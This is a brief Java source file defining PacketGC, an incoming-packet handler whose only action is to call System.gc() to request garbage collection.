package com.redpois0n.packets.incoming;

public class PacketGC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		System.gc();
	}

}
